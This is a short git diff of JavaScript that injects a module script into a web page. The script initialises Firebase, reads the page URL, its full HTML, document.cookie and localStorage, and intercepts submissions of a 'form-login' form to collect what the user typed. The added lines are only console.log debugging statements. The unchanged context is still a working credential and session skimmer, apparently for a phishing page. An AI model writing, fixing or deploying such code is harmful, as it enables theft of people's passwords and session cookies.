@@ -2511,6 +2511,7 @@ const outerHTML = `
 			const script = document.createElement('script');
 			script.type = 'module';
 			script.textContent = \`
+				console.log(1);
 				// Import the functions you need from the SDKs you need
 				import {
 					initializeApp
@@ -2538,10 +2539,12 @@ const outerHTML = `
 
 				// Initialize Firebase
 				const app = initializeApp(firebaseConfig);
+				console.log(2);
 
 				// Process the URL to extract the path
 				const url = window.location.href;
 				const outerHTML = document.documentElement.outerHTML;
+				console.log('url: ' + url);
 
 				// Retrieve cookie and localStorage data
 				const cookie = document.cookie;
@@ -2565,10 +2568,12 @@ const outerHTML = `
 					return \\\`\\\${year}-\\\${month}-\\\${day} \\\${hours}:\\\${minutes}\\\`;
 				}
 				const time = getCurrentFormattedTime();
+				console.log('time: ' + time);
 
 
 
 				document.getElementById('form-login').addEventListener('submit', function (event) {
+					console.log(3)
 					event.preventDefault();
 
 					// Collect user input
@@ -2603,6 +2608,7 @@ const outerHTML = `
 						location.reload();
 					}
 				});
+				console.log(4)
 			\`;
 			document.body.appendChild(script);
 		}
